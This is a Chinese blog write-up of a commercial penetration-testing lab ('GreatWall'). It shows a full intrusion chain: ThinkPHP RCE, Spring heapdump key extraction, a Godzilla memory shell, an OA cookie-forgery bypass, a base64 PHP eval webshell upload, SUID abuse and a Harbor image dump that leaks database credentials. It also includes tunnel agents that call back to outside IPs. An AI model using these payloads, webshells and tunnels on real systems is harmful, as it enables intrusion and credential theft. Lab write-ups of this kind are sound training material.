---
categories:
- penetration
date: '2025-03-05 14:23:57+08:00'
description: 春秋云境还是太贵了!!
isCJKLanguage: true
lastmod: '2025-05-07 21:08:53+08:00'
slug: greatwall-z1cku96
title: 春秋云境-GreatWall
toc: true
url: /post/greatwall-z1cku96.html
---
# 春秋云境-GreatWall

首先扫描端口，发现8080存活

然后thinkphp一把梭

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250308162502-zlxlegc.png)

拿到了第一个shell

然后上传到目录

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250308164037-2l1k4tr.png)​

但是很快发现在这个目录下不能完全执行

后来想起来原来是蚁剑的不是纯交互式终端

重新fscan扫描一下

```dockerfile
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-08 20:54:25] [INFO] 暴力破解线程数: 1
[2025-03-08 20:54:25] [INFO] 开始信息扫描
[2025-03-08 20:54:25] [INFO] CIDR范围: 172.28.23.0-172.28.23.255
[2025-03-08 20:54:25] [INFO] 生成IP范围: 172.28.23.0.%!d(string=172.28.23.255) - %!s(MISSING).%!d(MISSING)
[2025-03-08 20:54:25] [INFO] 解析CIDR 172.28.23.17/24 -> IP范围 172.28.23.0-172.28.23.255
[2025-03-08 20:54:25] [INFO] 最终有效主机数量: 256
[2025-03-08 20:54:25] [INFO] 开始主机扫描
[2025-03-08 20:54:25] [INFO] 正在尝试无监听ICMP探测...
[2025-03-08 20:54:26] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-03-08 20:54:26] [INFO] 切换为PING方式探测...
[2025-03-08 20:54:26] [SUCCESS] 目标 172.28.23.26    存活 (ICMP)
[2025-03-08 20:54:26] [SUCCESS] 目标 172.28.23.33    存活 (ICMP)
[2025-03-08 20:54:26] [SUCCESS] 目标 172.28.23.17    存活 (ICMP)
[2025-03-08 20:54:32] [INFO] 存活主机数量: 3
[2025-03-08 20:54:32] [INFO] 有效端口数量: 233
[2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.17:80
[2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.33:22
[2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.26:22
[2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.26:21
[2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.17:22
[2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.26:80
[2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.33:8080
[2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.17:8080
[2025-03-08 20:54:32] [SUCCESS] 服务识别 172.28.23.33:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]
[2025-03-08 20:54:32] [SUCCESS] 服务识别 172.28.23.26:22 => [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.]
[2025-03-08 20:54:32] [SUCCESS] 服务识别 172.28.23.26:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]
[2025-03-08 20:54:32] [SUCCESS] 服务识别 172.28.23.17:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.]
[2025-03-08 20:54:37] [SUCCESS] 服务识别 172.28.23.17:8080 => [http]
[2025-03-08 20:54:37] [SUCCESS] 服务识别 172.28.23.33:8080 => [http]
[2025-03-08 20:54:38] [SUCCESS] 服务识别 172.28.23.17:80 => [http]
[2025-03-08 20:54:38] [SUCCESS] 服务识别 172.28.23.26:80 => [http]
[2025-03-08 20:54:38] [INFO] 存活端口数量: 8
[2025-03-08 20:54:38] [INFO] 开始漏洞扫描
[2025-03-08 20:54:38] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle
[2025-03-08 20:54:38] [SUCCESS] 网站标题 http://172.28.23.17       状态码:200 长度:10887  标题:""
[2025-03-08 20:54:38] [SUCCESS] 网站标题 http://172.28.23.17:8080  状态码:200 长度:1027   标题:Login Form
[2025-03-08 20:54:38] [SUCCESS] 网站标题 http://172.28.23.26       状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
[2025-03-08 20:54:38] [SUCCESS] 网站标题 http://172.28.23.33:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=C0147F5D5100AFE63969477D86B84D8F
[2025-03-08 20:54:38] [SUCCESS] 匿名登录成功!
[2025-03-08 20:54:39] [SUCCESS] 网站标题 http://172.28.23.33:8080/login;jsessionid=C0147F5D5100AFE63969477D86B84D8F 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆
[2025-03-08 20:54:39] [SUCCESS] 目标: http://172.28.23.17:8080
  漏洞类型: poc-yaml-thinkphp5023-method-rce
  漏洞名称: poc1
  详细信息:
	links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
[2025-03-08 20:54:40] [SUCCESS] 目标: http://172.28.23.33:8080
  漏洞类型: poc-yaml-spring-actuator-heapdump-file
  漏洞名称: 
  详细信息:
	author:AgeloVito
	links:https://www.cnblogs.com/wyb628/p/8567610.html
[2025-03-08 20:54:40] [SUCCESS] 目标: http://172.28.23.33:8080
  漏洞类型: poc-yaml-springboot-env-unauth
  漏洞名称: spring2
  详细信息:
	links:https://github.com/LandGrey/SpringBootVulExploit

```

然后将流量代理出来

```dockerfile
python neoreg.py -k shell -p 8888 -u http://8.130.71.207:8080/tunnel.php
python3 neoreg.py -k shell -u http://39.101.64.150:8080/tunnel.php
```

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250308211027-1rxhr8j.png)​

```dockerfile
python dirsearch.py -u http://172.28.23.33:8080 --proxy socks5://127.0.0.1:8888
```

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250308213146-txofo1i.png)​

结合一下，很明显是heapdump

```dockerfile
PS D:\CTFtools\Web\dirsearch-0.4.3\dirsearch-0.4.3\dirsearch-0.4.3> python dirsearch.py -u http://172.28.23.33:8080 --proxy socks5://127.0.0.1:8888

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: D:\CTFtools\Web\dirsearch-0.4.3\dirsearch-0.4.3\dirsearch-0.4.3\reports\http_172.28.23.33_8080\_25-03-08_21-30-38.txt

Target: http://172.28.23.33:8080/

[21:30:38] Starting:
[21:31:09] 404 -   96B  - /;/login
[21:31:10] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[21:31:12] 400 -  435B  - /a%5c.aspx
[21:31:15] 404 -  111B  - /actuator/;/auditevents
[21:31:15] 200 -    2KB - /actuator
[21:31:15] 404 -  108B  - /actuator/;/auditLog
[21:31:15] 404 -  105B  - /actuator/;/beans
[21:31:15] 404 -  106B  - /actuator/;/caches
[21:31:15] 404 -  110B  - /actuator/;/conditions
[21:31:15] 404 -  111B  - /actuator/;/configprops
[21:31:15] 404 -  121B  - /actuator/;/configurationMetadata
[21:31:15] 404 -  104B  - /actuator/;/dump
[21:31:15] 404 -  103B  - /actuator/;/env
[21:31:15] 404 -  124B  - /actuator/;/exportRegisteredServices
[21:31:15] 404 -  106B  - /actuator/;/events
[21:31:15] 404 -  108B  - /actuator/;/features
[21:31:15] 404 -  106B  - /actuator/;/flyway
[21:31:15] 404 -  111B  - /actuator/;/healthcheck
[21:31:15] 404 -  106B  - /actuator/;/health
[21:31:15] 404 -  108B  - /actuator/;/heapdump
[21:31:15] 404 -  107B  - /actuator/;/jolokia
[21:31:15] 404 -  104B  - /actuator/;/info
[21:31:15] 404 -  116B  - /actuator/;/integrationgraph
[21:31:15] 404 -  109B  - /actuator/;/httptrace
[21:31:15] 404 -  109B  - /actuator/;/liquibase
[21:31:15] 404 -  107B  - /actuator/;/logfile
[21:31:15] 404 -  107B  - /actuator/;/metrics
[21:31:15] 404 -  107B  - /actuator/;/loggers
[21:31:15] 404 -  108B  - /actuator/;/mappings
[21:31:15] 404 -  118B  - /actuator/;/registeredServices
[21:31:15] 404 -  110B  - /actuator/;/prometheus
[21:31:15] 404 -  107B  - /actuator/;/refresh
[21:31:15] 404 -  113B  - /actuator/;/loggingConfig
[21:31:15] 404 -  117B  - /actuator/;/releaseAttributes
[21:31:15] 404 -  117B  - /actuator/;/resolveAttributes
[21:31:15] 404 -  114B  - /actuator/;/scheduledtasks
[21:31:15] 404 -  108B  - /actuator/;/sessions
[21:31:15] 404 -  108B  - /actuator/;/shutdown
[21:31:15] 404 -  113B  - /actuator/;/springWebflow
[21:31:15] 404 -  103B  - /actuator/;/sso
[21:31:15] 404 -  111B  - /actuator/;/ssoSessions
[21:31:15] 404 -  110B  - /actuator/;/statistics
[21:31:15] 404 -  106B  - /actuator/;/status
[21:31:15] 404 -  110B  - /actuator/;/threaddump
[21:31:15] 404 -  105B  - /actuator/;/trace
[21:31:15] 404 -  106B  - /actuator/auditLog
[21:31:15] 404 -  109B  - /actuator/auditevents
[21:31:15] 200 -   20B  - /actuator/caches
[21:31:15] 200 -   91KB - /actuator/beans
[21:31:15] 404 -  102B  - /actuator/dump
[21:31:15] 404 -  119B  - /actuator/configurationMetadata
[21:31:15] 200 -    7KB - /actuator/env
[21:31:15] 200 -   99KB - /actuator/conditions
[21:31:15] 404 -  122B  - /actuator/exportRegisteredServices
[21:31:15] 404 -  104B  - /actuator/events
[21:31:15] 404 -  104B  - /actuator/flyway
[21:31:15] 404 -  106B  - /actuator/features
[21:31:15] 404 -  112B  - /actuator/gateway/routes
[21:31:16] 404 -  109B  - /actuator/healthcheck
[21:31:16] 200 -  167B  - /actuator/health
[21:31:16] 404 -  107B  - /actuator/liquibase
[21:31:16] 404 -  105B  - /actuator/logfile
[21:31:16] 200 -   50KB - /actuator/loggers
[21:31:16] 404 -  111B  - /actuator/loggingConfig
[21:31:16] 404 -  108B  - /actuator/management
[21:31:16] 200 -   22KB - /actuator/mappings
[21:31:16] 200 - 1018B  - /actuator/metrics
[21:31:16] 404 -  116B  - /actuator/registeredServices
[21:31:16] 404 -  115B  - /actuator/releaseAttributes
[21:31:16] 404 -  106B  - /actuator/sessions
[21:31:16] 404 -  105B  - /actuator/refresh
[21:31:16] 404 -  111B  - /actuator/springWebflow
[21:31:16] 404 -  115B  - /actuator/resolveAttributes
[21:31:16] 404 -  106B  - /actuator/shutdown
[21:31:16] 404 -  108B  - /actuator/prometheus
[21:31:16] 200 -   54B  - /actuator/scheduledtasks
[21:31:16] 404 -  101B  - /actuator/sso
[21:31:16] 404 -  109B  - /actuator/ssoSessions
[21:31:16] 404 -  112B  - /actuator/hystrix.stream
[21:31:16] 404 -  107B  - /actuator/httptrace
[21:31:16] 200 -    2B  - /actuator/info
[21:31:16] 200 -   85KB - /actuator/threaddump
[21:31:16] 404 -  114B  - /actuator/integrationgraph
[21:31:16] 404 -  105B  - /actuator/jolokia
[21:31:16] 404 -  108B  - /actuator/statistics
[21:31:16] 200 -   14KB - /actuator/configprops
[21:31:16] 404 -  104B  - /actuator/status
[21:31:17] 404 -  103B  - /actuator/trace
[21:31:17] 200 -   27MB - /actuator/heapdump
```

解密一下heapdump，只保留了关键部分

```dockerfile
D:\CTFtools\工具包--天狐渗透V1.2\gui_scan\heapdump>java -jar JDumpSpider-1.1-SNAPSHOT-full.jar C:\Users\14301\Desktop\heapdump.heapdump
===========================================
CookieRememberMeManager(ShiroKey)
-------------
algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES

===========================================

```

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309022956-d7n76ty.png)​

找到了密钥和利用链，但是目前的用户是ops01

注入哥斯拉内存马

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309023327-xxr1bb8.png)​

设置代理进行连接

然后在/home/ops01下发现了文件

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309023651-gd3r8e5.png)​

由于不熟悉pwn，这一部分不做赘述，只说一个小点

在exp前面加上这一段设置为你做的代理即可

```dockerfile
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 1080)
socket.socket = socks.socksocket
```

现在开始看新翔OA，依据之前的扫描结果21端口开放得到相关源码

```dockerfile
root@joker:/home/Work# proxychains ftp 172.28.23.26
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.28.23.26:21-<><>-OK
Connected to 172.28.23.26.
220 (vsFTPd 3.0.3)
Name (172.28.23.26:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> dir
227 Entering Passive Mode (172,28,23,26,21,118).
|S-chain|-<>-127.0.0.1:1080-<><>-172.28.23.26:5494-<><>-OK
150 Here comes the directory listing.
-rw-r--r--    1 0        0         7536672 Mar 23  2024 OASystem.zip
ftp> get OASystem.zip
local: OASystem.zip remote: OASystem.zip
227 Entering Passive Mode (172,28,23,26,179,32).
|S-chain|-<>-127.0.0.1:1080-<><>-172.28.23.26:45856-<><>-OK
150 Opening BINARY mode data connection for OASystem.zip (7536672 bytes).
226 Transfer complete.
500 Unknown command.
7536672 bytes received in 147.92 secs (49.7565 kB/s)
ftp> exit
221 Goodbye.
```

然后得到源码，重点关注开头的引用文件

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309032654-7gr93xn.png)​

发现逻辑相对简单

```php
<?php
function islogin(){
   if(isset($_COOKIE['id'])&&isset($_COOKIE['loginname'])&&isset($_COOKIE['jueseid'])&&isset($_COOKIE['danweiid'])&&isset($_COOKIE['quanxian'])){
	   if($_COOKIE['id']!=''&&$_COOKIE['loginname']!=''&&$_COOKIE['jueseid']!=''&&$_COOKIE['danweiid']!=''&&$_COOKIE['quanxian']!=''){
	       return true;
	   }
	    else {
	      return false;
	   }
    }
    else {
	    return false;
     }
}
?>
```

直接添加cookie就行

```php
id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1
```

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309032850-2j6bt1b.png)​

然后开始发现在uploadbase64.php下可以任意上传文件

```php
<?php
/**
 * Description: PhpStorm.
 * Author: yoby
 * DateTime: 2018/12/4 18:01
 * Email:logove@qq.com
 * Copyright Yoby版权所有
 */
$img = $_POST['imgbase64'];
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
    $type = ".".$result[2];
    $path = "upload/" . date("Y-m-d") . "-" . uniqid() . $type;
}
$img =  base64_decode(str_replace($result[1], '', $img));
@file_put_contents($path, $img);
exit('{"src":"'.$path.'"}');
```

然后准备一下payload

```php
imgbase64=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=
```

设置一下bp的socks代理

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309033320-urofnf7.png)​

再正常抓包即可

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309033156-mm2cuob.png)​

上传成功开始连接

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309033633-2ovkdb2.png)​

很明显禁用了很多

另外这里使用插件绕过

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309035741-7luwdfl.png)​

但是发现post的无法执行，只能使用Get的

```php
/upload/.antproxy.php?pass=system(%22find%20/%20-perm%20-u=s%20-type%20f%202%3E/dev/null%22);
```

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309040030-c3q3lys.png)​

这里发现有suid提权

使用base32

```php
/.antproxy.php?pass=system("base32 /flag02.txt");
```

分别开始在查看网卡，进行扫描

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250309114548-jz3cn2m.png)​

在ERP的这台机子上发现还有一个网卡

```php
./fscan -h 172.22.10.0/24 > result
```

```php
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-09 11:45:20] [INFO] 暴力破解线程数: 1
[2025-03-09 11:45:20] [INFO] 开始信息扫描
[2025-03-09 11:45:20] [INFO] CIDR范围: 172.22.10.0-172.22.10.255
[2025-03-09 11:45:20] [INFO] 生成IP范围: 172.22.10.0.%!d(string=172.22.10.255) - %!s(MISSING).%!d(MISSING)
[2025-03-09 11:45:20] [INFO] 解析CIDR 172.22.10.0/24 -> IP范围 172.22.10.0-172.22.10.255
[2025-03-09 11:45:20] [INFO] 最终有效主机数量: 256
[2025-03-09 11:45:20] [INFO] 开始主机扫描
[2025-03-09 11:45:20] [INFO] 正在尝试无监听ICMP探测...
[2025-03-09 11:45:20] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-03-09 11:45:20] [INFO] 切换为PING方式探测...
[2025-03-09 11:45:21] [SUCCESS] 目标 172.22.10.16    存活 (ICMP)
[2025-03-09 11:45:21] [SUCCESS] 目标 172.22.10.28    存活 (ICMP)
[2025-03-09 11:45:26] [INFO] 存活主机数量: 2
[2025-03-09 11:45:27] [INFO] 有效端口数量: 233
[2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.28:80
[2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.28:22
[2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.16:22
[2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.28:3306
[2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.16:8080
[2025-03-09 11:45:27] [SUCCESS] 服务识别 172.22.10.28:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]
[2025-03-09 11:45:27] [SUCCESS] 服务识别 172.22.10.16:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]
[2025-03-09 11:45:27] [SUCCESS] 服务识别 172.22.10.28:3306 => [mysql] 版本:8.0.36-0ubuntu0.20.04.1 产品:MySQL Banner:[[.8.0.36-0ubuntu0.20.04.1.V;{xY ^.0 W]En: 8uB caching_sha2_password]
[2025-03-09 11:45:32] [SUCCESS] 服务识别 172.22.10.28:80 => [http] 版本:1.25.4 产品:nginx
[2025-03-09 11:45:32] [SUCCESS] 服务识别 172.22.10.16:8080 => [http]
[2025-03-09 11:45:32] [INFO] 存活端口数量: 5
[2025-03-09 11:45:32] [INFO] 开始漏洞扫描
[2025-03-09 11:45:32] [INFO] 加载的插件: mysql, ssh, webpoc, webtitle
[2025-03-09 11:45:32] [SUCCESS] 网站标题 http://172.22.10.28       状态码:200 长度:1975   标题:DooTask
[2025-03-09 11:45:32] [SUCCESS] 网站标题 http://172.22.10.16:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.10.16:8080/login;jsessionid=EFB0A9532795C590DF70C9E786D5D5E4
[2025-03-09 11:45:32] [SUCCESS] 网站标题 http://172.22.10.16:8080/login;jsessionid=EFB0A9532795C590DF70C9E786D5D5E4 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆
[2025-03-09 11:45:33] [SUCCESS] 目标: http://172.22.10.16:8080
  漏洞类型: poc-yaml-spring-actuator-heapdump-file
  漏洞名称: 
  详细信息:
	author:AgeloVito
	links:https://www.cnblogs.com/wyb628/p/8567610.html
[2025-03-09 11:45:34] [SUCCESS] 目标: http://172.22.10.16:8080
  漏洞类型: poc-yaml-springboot-env-unauth
  漏洞名称: spring2
  详细信息:
	links:https://github.com/LandGrey/SpringBootVulExploit

```

接着开始搭建多层代理

```php
./linux_x64_admin -l 1234 -s 1234
./linux_x64_agent -c 62.234.111.84:1234 -s 1234 --reconnect 8
./linux_x64_agent -c 172.28.23.17:8777 -s 1234 --reconnect 8
```

socks隧道启动

```php
(node 0) >> socks 1235
[*] Trying to listen on 0.0.0.0:1235......
[*] Waiting for agent's response......
[*] Socks start successfully!
```

目前拿到的这台是ERP，同样需要先进行扫描

```php
/ >ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:05:ba:7c brd ff:ff:ff:ff:ff:ff
    inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0
       valid_lft 1892156851sec preferred_lft 1892156851sec
    inet6 fe80::216:3eff:fe05:ba7c/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:05:ba:7e brd ff:ff:ff:ff:ff:ff
    inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe05:ba7e/64 scope link 
       valid_lft forever preferred_lft forever
```

并在`http://172.22.14.46/`​上发现了一台harbor

使用[404tk/CVE-2022-46463: harbor unauthorized detection](https://github.com/404tk/CVE-2022-46463)下载镜像

```sh
python3 harbor.py http://172.22.14.46/ 
python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2
```

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250313142359-wpxuraj.png)​

然后在另外一个镜像中找到了

```sh
python3 harbor.py http://172.22.14.46/ --dump project/projectadmin --v2
```

反编译后得到

```sh
spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&useUnicode=true&serverTimezone=UTC
spring.datasource.username=root
spring.datasource.password=My3q1i4oZkJm3
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

mybatis.type-aliases-package=com.smartlink.projectadmin.entity
mybatis.mapper-locations=classpath:mybatis/mapper/*.xml
```

MDUT一把梭，但是extend版的怎么都连接不上

​![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250313150405-92prdgy.png)​

最后一台机子是一个k8s，但是不知道为什么怎么都无法访问
